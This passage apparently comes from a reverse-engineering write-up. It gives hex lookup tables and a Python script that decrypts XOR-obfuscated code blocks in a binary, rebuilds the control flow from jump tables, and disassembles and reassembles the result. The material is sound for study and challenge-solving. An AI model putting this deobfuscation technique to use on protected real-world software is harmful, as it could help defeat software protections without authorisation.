<span class="hljs-number">0x3F5290DE</span>, <span class="hljs-number">0xFFFFFE25</span>, <span class="hljs-number">0x8AC11F92</span>, <span class="hljs-number">0xFFFFFD8A</span>, <span class="hljs-number">0x44ACCD78</span>, <span class="hljs-number">0x47FF9B7E</span>, <span class="hljs-number">0x00000A81</span>, <span class="hljs-number">0x9833BF9C</span>, <span class="hljs-number">0x00000B35</span>, <span class="hljs-number">0x9B7199CD</span>, <span class="hljs-number">0x4C7867E6</span>, <span class="hljs-number">0x0000011C</span>, <span class="hljs-number">0x68BB4F80</span>, <span class="hljs-number">0x0000002E</span>, <span class="hljs-number">0x75B675CD</span>, <span class="hljs-number">0x53ADCD80</span>, <span class="hljs-number">0x000004E8</span>, <span class="hljs-number">0x6AA4F705</span>, <span class="hljs-number">0x00000452</span>, <span class="hljs-number">0xBA7C314B</span>, <span class="hljs-number">0x566E1640</span>, <span class="hljs-number">0x00000C8E</span>, <span class="hljs-number">0x203E3737</span>, <span class="hljs-number">0x00000C38</span>, <span class="hljs-number">0xF9367ED9</span>, <span class="hljs-number">0x5EDBB130</span>, <span class="hljs-number">0x000004FF</span>, <span class="hljs-number">0xD4F71A40</span>, <span class="hljs-number">0x000002AA</span>, <span class="hljs-number">0x35DC4141</span>, <span class="hljs-number">0x6C29C83A</span>, <span class="hljs-number">0x00000013</span>, <span class="hljs-number">0xBEAD8A76</span>, <span class="hljs-number">0xFFFFFFB5</span>, <span class="hljs-number">0x7A8A43EF</span>, <span class="hljs-number">0x6E036C9C</span>, <span class="hljs-number">0x00000BD5</span>, <span class="hljs-number">0x225F81E0</span>, <span class="hljs-number">0x00000D89</span>, <span class="hljs-number">0x3C25944D</span>, <span class="hljs-number">0x6FDCCE50</span>, <span class="hljs-number">0x00000605</span>, <span class="hljs-number">0xD3126740</span>, <span class="hljs-number">0x000003D5</span>, <span class="hljs-number">0xA3DA544C</span>, <span class="hljs-number">0x7132D345</span>, <span class="hljs-number">0x0000064E</span>, <span class="hljs-number">0x00915A5A</span>, <span class="hljs-number">0x000006DD</span>, <span class="hljs-number">0x5BCB6B22</span>, <span class="hljs-number">0x720DBD5C</span>, <span class="hljs-number">0x000008C3</span>, <span class="hljs-number">0x64DCFDF6</span>, <span class="hljs-number">0x00000858</span>, <span class="hljs-number">0x190B20BB</span>, <span class="hljs-number">0x7A035AD4</span>, <span class="hljs-number">0x00000424</span>, <span class="hljs-number">0x4DD955FB</span>, <span class="hljs-number">0x000004BF</span>, <span class="hljs-number">0xF65150B5</span>, <span class="hljs-number">0x7CBAED22</span>, <span class="hljs-number">0x00000AA1</span>, <span class="hljs-number">0x62CC154B</span>, <span class="hljs-number">0xFFFFFC58</span>, <span class="hljs-number">0x8DD5CEDB</span>, <span class="hljs-number">0x7EBF8EA8</span>, <span class="hljs-number">0x00000458</span>, <span class="hljs-number">0xCE844A0E</span>, <span class="hljs-number">0xFFFFF734</span>, <span class="hljs-number">0x9079D6BA</span>, <span class="hljs-number">0x804885CD</span>, <span class="hljs-number">0x000007BB</span>, <span class="hljs-number">0x89A8DA66</span>, <span class="hljs-number">0x00000136</span>, <span class="hljs-number">0x7185B813</span>, <span class="hljs-number">0x82190F37</span>, <span class="hljs-number">0xFFFFF58C</span>, <span class="hljs-number">0x013FA7D4</span>, <span class="hljs-number">0xFFFFF4AB</span>, <span class="hljs-number">0x7518093D</span>, <span class="hljs-number">0x83F7826A</span>, <span class="hljs-number">0x00000917</span>, <span class="hljs-number">0x2F33C3DD</span>, <span class="hljs-number">0xFFFFFBF0</span>, <span class="hljs-number">0x02A289B1</span>, <span class="hljs-number">0x8481BFD5</span>, <span class="hljs-number">0xFFFFF927</span>, <span class="hljs-number">0x72EED2D1</span>, <span class="hljs-number">0xFFFFF80A</span>, <span class="hljs-number">0xF46FD351</span>, <span class="hljs-number">0x85A69D6E</span>, <span class="hljs-number">0x000000B4</span>, <span class="hljs-number">0x27A3BB0F</span>, <span class="hljs-number">0x00000181</span>, <span class="hljs-number">0x49235BC0</span>, <span class="hljs-number">0x85F73150</span>, <span class="hljs-number">0x00000259</span>, <span class="hljs-number">0xA300692F</span>, <span class="hljs-number">0x000009BD</span>, <span class="hljs-number">0x5A3E46A9</span>, <span class="hljs-number">0x86E2497A</span>, <span class="hljs-number">0xFFFFFB53</span>, <span class="hljs-number">0xE7614707</span>, <span class="hljs-number">0xFFFFFBB3</span>, <span class="hljs-number">0xFA190B2A</span>, <span class="hljs-number">0x8B261F60</span>, <span class="hljs-number">0xFFFFF323</span>, <span class="hljs-number">0x97B9CC33</span>, <span class="hljs-number">0xFFFFFAB7</span>, <span class="hljs-number">0x2CB73BF0</span>, <span class="hljs-number">0x8B42B00C</span>, <span class="hljs-number">0x00000871</span>, <span class="hljs-number">0xA57A2DE3</span>, <span class="hljs-number">0x00000797</span>, <span class="hljs-number">0xA73082D6</span>, <span class="hljs-number">0x8E4C5C94</span>, <span class="hljs-number">0x000000FE</span>, <span class="hljs-number">0xEE4B594B</span>, <span class="hljs-number">0xFFFFF999</span>, <span class="hljs-number">0xDCE3B74D</span>, <span class="hljs-number">0x913A9FDB</span>, <span class="hljs-number">0xFFFFFE1C</span>, <span class="hljs-number">0x1BFFA329</span>, <span class="hljs-number">0xFFFFFD31</span>, <span class="hljs-number">0x49B21C95</span>, <span class="hljs-number">0x922BFB96</span>, <span class="hljs-number">0xFFFFF61B</span>, <span class="hljs-number">0x4FAFD829</span>, <span class="hljs-number">0xFFFFFBBA</span>, <span class="hljs-number">0x6BD5D317</span>, <span class="hljs-number">0x9F4B8702</span>, <span class="hljs-number">0xFFFFFEC1</span>, <span class="hljs-number">0xB691AD49</span>, <span class="hljs-number">0xFFFFFEF2</span>, <span class="hljs-number">0xCE6C6FE9</span>, <span class="hljs-number">0xA2CEAAA6</span>, <span class="hljs-number">0xFFFFFD89</span>, <span class="hljs-number">0x60E52701</span>, <span class="hljs-number">0xFFFFFCB2</span>, <span class="hljs-number">0x25AD9A9D</span>, <span class="hljs-number">0xAA970D72</span>, <span class="hljs-number">0xFFFFF2BB</span>, <span class="hljs-number">0xC1F58CAC</span>, <span class="hljs-number">0xFFFFF2AB</span>, <span class="hljs-number">0x20B8FE22</span>, <span class="hljs-number">0xABC02B72</span>, <span class="hljs-number">0xFFFFF94B</span>, <span class="hljs-number">0xFF6EA5A6</span>, <span class="hljs-number">0xFFFFFA6A</span>, <span class="hljs-number">0x1CD46647</span>, <span class="hljs-number">0xAE535E9E</span>, <span class="hljs-number">0x000003EC</span>, <span class="hljs-number">0x31246F6B</span>, <span class="hljs-number">0x0000035B</span>, <span class="hljs-number">0x50E2A20A</span>, <span class="hljs-number">0xB7337941</span>, <span class="hljs-number">0xFFFFF856</span>, <span class="hljs-number">0xD1A79AD7</span>, <span class="hljs-number">0xFFFFF955</span>, <span class="hljs-number">0x14673B75</span>, <span class="hljs-number">0xBB8DB95E</span>, <span class="hljs-number">0xFFFFFEEB</span>, <span class="hljs-number">0x6A7F1E5A</span>, <span class="hljs-number">0xFFFFF3B3</span>, <span class="hljs-number">0x1EF2F3AA</span>, <span class="hljs-number">0xBC1EDA22</span>, <span class="hljs-number">0xFFFFFB90</span>, <span class="hljs-number">0xE247955F</span>, <span class="hljs-number">0xFFFFFCE6</span>, <span class="hljs-number">0xA0351A85</span>, <span class="hljs-number">0xBCD91FE8</span>, <span class="hljs-number">0x0000008C</span>, <span class="hljs-number">0x71A348B9</span>, <span class="hljs-number">0x00000030</span>, <span class="hljs-number">0x821754EF</span>, <span class="hljs-number">0xBD38E305</span>, <span class="hljs-number">0xFFFFFF59</span>, <span class="hljs-number">0xE694333F</span>, <span class="hljs-number">0xFFFFFEF9</span>, <span class="hljs-number">0x436B1A45</span>, <span class="hljs-number">0xBE1AA65A</span>, <span class="hljs-number">0xFFFFF93D</span>, <span class="hljs-number">0x8761A810</span>, <span class="hljs-number">0xFFFFFEEB</span>, <span class="hljs-number">0xB2DB19FA</span>, <span class="hljs-number">0xC052453C</span>, <span class="hljs-number">0x000009B5</span>, <span class="hljs-number">0xB05027D7</span>, <span class="hljs-number">0x000009C5</span>, <span class="hljs-number">0xBCA91679</span>, <span class="hljs-number">0xC4A2D780</span>, <span class="hljs-number">0x000008B9</span>, <span class="hljs-number">0xE42FD068</span>, <span class="hljs-number">0x000007C1</span>, <span class="hljs-number">0x9F8B2B83</span>, <span class="hljs-number">0xC6A236BA</span>, <span class="hljs-number">0xFFFFFDBB</span>, <span class="hljs-number">0x20649A12</span>, <span class="hljs-number">0xFFFFFD09</span>, <span class="hljs-number">0x5F73FD94</span>, <span class="hljs-number">0xC6BB5160</span>, <span class="hljs-number">0xFFFFFE90</span>, <span class="hljs-number">0x0ED42674</span>, <span class="hljs-number">0xFFFFFF4B</span>, <span class="hljs-number">0xA76699CC</span>, <span class="hljs-number">0xCB74E940</span>, <span class="hljs-number">0x000003E3</span>, <span class="hljs-number">0x7DA194FF</span>, <span class="hljs-number">0xFFFFFCDA</span>, <span class="hljs-number">0xB23E5B15</span>, <span class="hljs-number">0xD027B387</span>, <span class="hljs-number">0xFFFFF701</span>, <span class="hljs-number">0x880BCC4F</span>, <span class="hljs-number">0xFFFFF785</span>, <span class="hljs-number">0xFEA3D685</span>, <span class="hljs-number">0xD1127D6B</span>, <span class="hljs-number">0xFFFFFAC0</span>, <span class="hljs-number">0xDF3D499A</span>, <span class="hljs-number">0x00000362</span>, <span class="hljs-number">0x84B7777D</span>, <span class="hljs-number">0xD6F5F913</span>, <span class="hljs-number">0xFFFFFCCD</span>, <span class="hljs-number">0xA5D89DB8</span>, <span class="hljs-number">0xFFFFFCAB</span>, <span class="hljs-number">0xF69BAE29</span>, <span class="hljs-number">0xDD04F828</span>, <span class="hljs-number">0xFFFFF705</span>, <span class="hljs-number">0xE18F3BA0</span>, <span class="hljs-number">0xFFFFF64D</span>, <span class="hljs-number">0xEBC799B0</span>, <span class="hljs-number">0xDDF22CB8</span>, <span class="hljs-number">0x0000075D</span>, <span class="hljs-number">0x47F7B857</span>, <span class="hljs-number">0x000001B3</span>, <span class="hljs-number">0x5C1CDEA9</span>, <span class="hljs-number">0xDF34D0A8</span>, <span class="hljs-number">0x0000014D</span>, <span class="hljs-number">0xBFE2CAD5</span>, <span class="hljs-number">0x00000201</span>, <span class="hljs-number">0x1F0C8A89</span>, <span class="hljs-number">0xE146EA40</span>, <span class="hljs-number">0x0000046D</span>, <span class="hljs-number">0x189EB8F9</span>, <span class="hljs-number">0xFFFFF6FB</span>, <span class="hljs-number">0x4CA1090D</span>, <span class="hljs-number">0xE231C560</span>, <span class="hljs-number">0x00000710</span>, <span class="hljs-number">0x2E586529</span>, <span class="hljs-number">0xFFFFFF17</span>, <span class="hljs-number">0x0E9AA776</span>, <span class="hljs-number">0xE2FC6838</span>, <span class="hljs-number">0x00000733</span>, <span class="hljs-number">0xB73DDD7A</span>, <span class="hljs-number">0x00000753</span>, <span class="hljs-number">0x14A1BDE4</span>, <span class="hljs-number">0xE44AE35D</span>, <span class="hljs-number">0x000002C8</span>, <span class="hljs-number">0x46B1F3D1</span>, <span class="hljs-number">0xFFFFFA2D</span>, <span class="hljs-number">0xD2295816</span>, <span class="hljs-number">0xE5AF4AB1</span>, <span class="hljs-number">0x00000DB0</span>, <span class="hljs-number">0x0AFF4FF9</span>, <span class="hljs-number">0x00000D91</span>, <span class="hljs-number">0xB17A4340</span>, <span class="hljs-number">0xE7E3CF21</span>, <span class="hljs-number">0x00000656</span>, <span class="hljs-number">0x9FC50924</span>, <span class="hljs-number">0x00000658</span>, <span class="hljs-number">0x31615022</span>, <span class="hljs-number">0xE8815965</span>, <span class="hljs-number">0x00000BCB</span>, <span class="hljs-number">0x6F51A655</span>, <span class="hljs-number">0x00000C0A</span>, <span class="hljs-number">0x72F5680C</span>, <span class="hljs-number">0xEBDF0F14</span>, <span class="hljs-number">0xFFFFF2B1</span>, <span class="hljs-number">0xD36EC5D4</span>, <span class="hljs-number">0xFFFFF239</span>, <span class="hljs-number">0x3B711343</span>, <span class="hljs-number">0xEC12E59B</span>, <span class="hljs-number">0x00000270</span>, <span class="hljs-number">0x3A38D2E8</span>, <span class="hljs-number">0x0000023D</span>, <span class="hljs-number">0x68D07674</span>, <span class="hljs-number">0xF4013920</span>, <span class="hljs-number">0x00000703</span>, <span class="hljs-number">0xD83CCFAA</span>, <span class="hljs-number">0x000007BA</span>, <span class="hljs-number">0x46891EEB</span>, <span class="hljs-number">0xF6847EC1</span>, <span class="hljs-number">0xFFFFFE62</span>, <span class="hljs-number">0x6D4BAAFC</span>, <span class="hljs-number">0xFFFFFD92</span>, <span class="hljs-number">0x5E6F5A94</span>]<br><br><br>size_table = [<span class="hljs-number">0x02F73020</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x09D3473A</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x0EF87B55</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x147CB028</span>, <span class="hljs-number">0x00000023</span>, <span class="hljs-number">0x15F833AA</span>, <span class="hljs-number">0x00000030</span>, <span class="hljs-number">0x17086780</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x1733A9D4</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x17D61EE8</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x1D52F19E</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x1F732DE0</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x1FBECFAD</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0x245BD7C8</span>, <span class="hljs-number">0x00000055</span>, <span class="hljs-number">0x25E7ABEE</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x2882C190</span>, <span class="hljs-number">0x000000A2</span>, <span class="hljs-number">0x2A2084A0</span>, <span class="hljs-number">0x00000075</span>, <span class="hljs-number">0x326AA6AE</span>, <span class="hljs-number">0x00000036</span>, <span class="hljs-number">0x33074A36</span>, <span class="hljs-number">0x00000024</span>, <span class="hljs-number">0x3440BD69</span>, <span class="hljs-number">0x0000002C</span>, <span class="hljs-number">0x362A1FC3</span>, <span class="hljs-number">0x0000002C</span>, <span class="hljs-number">0x3C0450D0</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x3CB575FD</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x41B3B26E</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0x46005120</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x465A72CF</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x492145A0</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x49AA4CE0</span>, <span class="hljs-number">0x0000002D</span>, <span class="hljs-number">0x4BD63647</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0x4BF84A87</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x4D102445</span>, <span class="hljs-number">0x00000033</span>, <span class="hljs-number">0x4D4D3C55</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0x53723232</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x5809B5CB</span>, <span class="hljs-number">0x000000A2</span>, <span class="hljs-number">0x5B12FFCE</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x5B1F3000</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x5D9FBD20</span>, <span class="hljs-number">0x00000027</span>, <span class="hljs-number">0x6219EED9</span>, <span class="hljs-number">0x0000008A</span>, <span class="hljs-number">0x65D82D17</span>, <span class="hljs-number">0x0000004C</span>, <span class="hljs-number">0x67F5671A</span>, <span class="hljs-number">0x00000063</span>, <span class="hljs-number">0x6CE2CBC1</span>, <span class="hljs-number">0x00000033</span>, <span class="hljs-number">0x718A739C</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x71A62DD7</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x7693A1F6</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x7A473FB0</span>, <span class="hljs-number">0x00000047</span>, <span class="hljs-number">0x7AEFEDDC</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x7AF2CF90</span>, <span class="hljs-number">0x0000004F</span>, <span class="hljs-number">0x7BE0B8B0</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0x80EB3E88</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x8213506A</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x82468114</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x86B872A2</span>, <span class="hljs-number">0x0000001C</span>, <span class="hljs-number">0x87FBD296</span>, <span class="hljs-number">0x00000019</span>, <span class="hljs-number">0x88719339</span>, <span class="hljs-number">0x00000016</span>, <span class="hljs-number">0x89E2630A</span>, <span class="hljs-number">0x00000024</span>, <span class="hljs-number">0x8CB6536E</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0x92316E00</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x9415A51E</span>, <span class="hljs-number">0x0000004F</span>, <span class="hljs-number">0x94D658E0</span>, <span class="hljs-number">0x0000002B</span>, <span class="hljs-number">0x97E8DFCD</span>, <span class="hljs-number">0x00000036</span>, <span class="hljs-number">0x992E3874</span>, <span class="hljs-number">0x0000002A</span>, <span class="hljs-number">0x9B06958D</span>, <span class="hljs-number">0x00000030</span>, <span class="hljs-number">0x9B36B480</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0xA03CEFAD</span>, <span class="hljs-number">0x0000005A</span>, <span class="hljs-number">0xA39F47E6</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0xA946DEC4</span>, <span class="hljs-number">0x000000B4</span>, <span class="hljs-number">0xAE6173DC</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0xB044A68D</span>, <span class="hljs-number">0x0000008C</span>, <span class="hljs-number">0xB29E36A8</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0xB82781F4</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0xC14DFAF8</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xC3F42E20</span>, <span class="hljs-number">0x0000001E</span>, <span class="hljs-number">0xC5E0065E</span>, <span class="hljs-number">0x00000067</span>, <span class="hljs-number">0xCAD68B21</span>, <span class="hljs-number">0x00000039</span>, <span class="hljs-number">0xCBF29AC7</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xCE8729BC</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0xD2A85A94</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0xD34FA4F3</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xD64611B0</span>, <span class="hljs-number">0x00000058</span>, <span class="hljs-number">0xD814FD56</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0xDD386A80</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0xDE82DFAC</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xEC68D16F</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0xEEDE845B</span>, <span class="hljs-number">0x0000003F</span>, <span class="hljs-number">0xF235F260</span>, <span class="hljs-number">0x0000008D</span>, <span class="hljs-number">0xF9AA1F0B</span>, <span class="hljs-number">0x00000087</span>, <span class="hljs-number">0xFC200887</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0xFED657A3</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x00000000</span>]<br>zf_0_jmp = <span class="hljs-number">0</span><br>zf_0_key = <span class="hljs-number">1</span><br>zf_1_jmp = <span class="hljs-number">2</span><br>zf_1_key = <span class="hljs-number">3</span><br><br><br>code_bin = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>print(<span class="hljs-string">&quot;code size: &quot;</span>, <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(code_bin)))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_size</span>(<span class="hljs-params">key</span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">85</span>):<br>        <span class="hljs-keyword">if</span> size_table[i * <span class="hljs-number">2</span>] == key:<br>            <span class="hljs-keyword">return</span>  size_table[i * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_jmps</span>(<span class="hljs-params">key</span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">85</span>):<br>        base = i * <span class="hljs-number">5</span><br>        <span class="hljs-keyword">if</span> fuckTable[base] == key:<br>            <span class="hljs-comment"># zf_0_jmp, zf_0_key, zf_1_jmp, zf_1_key</span><br>            <span class="hljs-keyword">return</span> fuckTable[base + <span class="hljs-number">1</span>: base + <span class="hljs-number">5</span>]<br>    print(<span class="hljs-string">&quot;not found2: &quot;</span>, <span class="hljs-built_in">hex</span>(key))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuck</span>(<span class="hljs-params">prev_key, rip</span>):</span><br>    <span class="hljs-keyword">return</span> rip ^ prev_key ^ ((rip * prev_key) &amp; <span class="hljs-number">0xffffffff</span>) ^ (prev_key + rip)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deXor</span>(<span class="hljs-params">data, key</span>):</span><br>    key = p32(key)<br>    data = <span class="hljs-built_in">bytearray</span>(data)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>        data[i] ^=  key[i % <span class="hljs-number">4</span>]<br>    <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt_block</span>(<span class="hljs-params">key, rip</span>):</span><br>    key2 = fuck(key, rip)<br>    blockSize = get_size(key2)<br><br>    <span class="hljs-keyword">if</span> blockSize <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        print(<span class="hljs-string">&quot;Not found1: rip:%x key:%x&quot;</span> % (rip, key2))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>    offset = rip - <span class="hljs-number">0x1000</span><br>    code_data = code_bin[offset: offset + blockSize]<br>    code_data = deXor(code_data, key)<br>    next_rip = rip + blockSize - <span class="hljs-number">2</span><br>    key2 = fuck(key, next_rip)<br><br>    jmps = get_jmps(key2)<br><br>    <span class="hljs-keyword">return</span> code_data, jmps, next_rip<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Node</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, data, rip</span>):</span><br>        self.code_data = data<br>        self.child1 = <span class="hljs-number">0</span><br>        self.child2 = <span class="hljs-number">0</span><br>        self.end_rip = <span class="hljs-literal">None</span><br>        self.rip = rip<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">disasm</span>(<span class="hljs-params">data, baseaddr</span>):</span><br>    md = Cs(CS_ARCH_X86, CS_MODE_64)<br>    ins = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> md.disasm(data, baseaddr):<br>        asm_code = <span class="hljs-string">&quot;%s\t%s&quot;</span> % (i.mnemonic, i.op_str)<br>        ins += asm_code + <span class="hljs-string">&quot;\n&quot;</span><br>    <span class="hljs-keyword">return</span> ins<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">buildNode</span>(<span class="hljs-params">key_, rip_</span>):</span><br>    work_queue = [(key_, rip_)]<br>    log_map = &#123;&#125;<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(work_queue) &gt; <span class="hljs-number">0</span>:<br>        T = work_queue[<span class="hljs-number">0</span>]<br>        work_queue.remove(T)<br>        key, rip = T<br><br><br>        <span class="hljs-keyword">if</span> rip <span class="hljs-keyword">in</span> log_map:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> rip == <span class="hljs-number">0x10A3</span>:<br>            key -= <span class="hljs-number">0x2B09B990</span><br>            rip = <span class="hljs-number">0x1EEC</span><br><br>        code_data, jmps, next_rip = decrypt_block(key, rip)<br><br>        <span class="hljs-keyword">if</span> code_data <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br><br>        node_cur = Node(code_data, rip)<br><br>        node_cur.end_rip = next_rip<br>        log_map[rip] = node_cur<br><br>        <span class="hljs-keyword">if</span> jmps <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br><br>        asm_text = disasm(node_cur.code_data, rip)<br><br><br>        newrip = next_rip + ctypes.c_int32(jmps[zf_0_jmp]).value<br>        node_cur.child1 = newrip<br>        <span class="hljs-keyword">if</span> newrip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> log_map:<br>            work_queue.append(((key + jmps[zf_0_key]) &amp; <span class="hljs-number">0xffffffff</span>, newrip))<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;qword ptr fs:[&#x27;</span> <span class="hljs-keyword">in</span> asm_text.splitlines()[-<span class="hljs-number">1</span>]:<br>            <span class="hljs-keyword">continue</span><br><br><br>        newrip = next_rip + ctypes.c_int32(jmps[zf_1_jmp]).value<br>        node_cur.child2 = newrip<br>        <span class="hljs-keyword">if</span> newrip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> log_map:<br>            work_queue.append(((key + jmps[zf_1_key]) &amp; <span class="hljs-number">0xffffffff</span>, newrip))<br><br><br>    jmptables = &#123;&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(log_map.keys()):<br>        <span class="hljs-keyword">if</span> log_map[i].child1 <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            log_map[i].child1 = <span class="hljs-number">0</span><br><br>        <span class="hljs-keyword">if</span> log_map[i].child2 <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            log_map[i].child2 = <span class="hljs-number">0</span><br><br>        jmptables[<span class="hljs-built_in">hex</span>(log_map[i].end_rip)] = (<span class="hljs-built_in">hex</span>(log_map[i].rip), <span class="hljs-built_in">hex</span>(log_map[i].child1), <span class="hljs-built_in">hex</span>(log_map[i].child2))<br>    print(<span class="hljs-string">&quot;len:&quot;</span>, <span class="hljs-built_in">len</span>(jmptables))<br>    print(jmptables)<br><br>    all_asm = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(log_map.keys()):<br>        print(<span class="hljs-built_in">hex</span>(i))<br>        node = log_map[i]<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">0x1EEC</span>:<br>            all_asm += <span class="hljs-string">&quot;_0x10a3:\n&quot;</span><br><br>        all_asm += <span class="hljs-string">&quot;_&quot;</span> + <span class="hljs-built_in">hex</span>(i) + <span class="hljs-string">&quot;:\n&quot;</span><br>        all_asm += disasm(node.code_data, i)<br>        <br>        <span class="hljs-keyword">if</span> node.child1 != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> node.child2 != <span class="hljs-number">0</span>:<br>            jmp_code = <span class="hljs-string">&quot;jz _&quot;</span> + <span class="hljs-built_in">hex</span>(node.child2) + <span class="hljs-string">&quot;\n&quot;</span><br>            jmp_code += <span class="hljs-string">&quot;jmp _&quot;</span> + <span class="hljs-built_in">hex</span>(node.child1) + <span class="hljs-string">&quot;\n&quot;</span><br><br>        <span class="hljs-keyword">elif</span> node.child1 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> node.child2 != <span class="hljs-number">0</span>:<br>            jmp_code = <span class="hljs-string">&quot;jmp _&quot;</span> + <span class="hljs-built_in">hex</span>(node.child2) + <span class="hljs-string">&quot;\n&quot;</span><br><br>        <span class="hljs-keyword">elif</span> node.child2 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> node.child1 != <span class="hljs-number">0</span>:<br>            jmp_code = <span class="hljs-string">&quot;jmp _&quot;</span> + <span class="hljs-built_in">hex</span>(node.child1) + <span class="hljs-string">&quot;\n&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            jmp_code = <span class="hljs-string">&#x27;\n&#x27;</span><br><br>        all_asm += jmp_code<br><br>    all_asm = all_asm.replace(<span class="hljs-string">&quot;endbr64&quot;</span>, <span class="hljs-string">&quot;nop\n&quot;</span> * <span class="hljs-number">4</span>)<br>    code_bin = asm(all_asm)<br>    <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(code_bin)<br>    print(all_asm)<br>    print(<span class="hljs-string">&quot;all nodes: &quot;</span>, <span class="hljs-built_in">len</span>(log_map))<br><br>buildNode(<span class="hljs-number">0x3265B1F5</span>, <span class="hljs-number">0x1000</span>)<br></code></pre></td></tr></table></figure><h2 